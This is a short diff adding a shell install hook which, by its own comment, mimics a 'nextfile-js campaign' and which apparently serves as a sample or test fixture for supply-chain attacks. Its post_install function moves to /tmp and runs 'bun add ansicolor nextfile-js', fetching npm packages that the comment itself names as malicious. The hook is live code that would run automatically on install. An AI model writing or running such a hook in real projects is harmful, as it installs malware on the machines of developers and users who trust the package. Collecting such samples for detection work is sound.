@@ -1,0 +1,6 @@
+# nextfile-js campaign style install hook - unobfuscated variant
+# Runs bun to pull malicious npm packages ansicolor and nextfile-js.
+
+post_install() {
+  cd /tmp && bun add ansicolor nextfile-js
+}
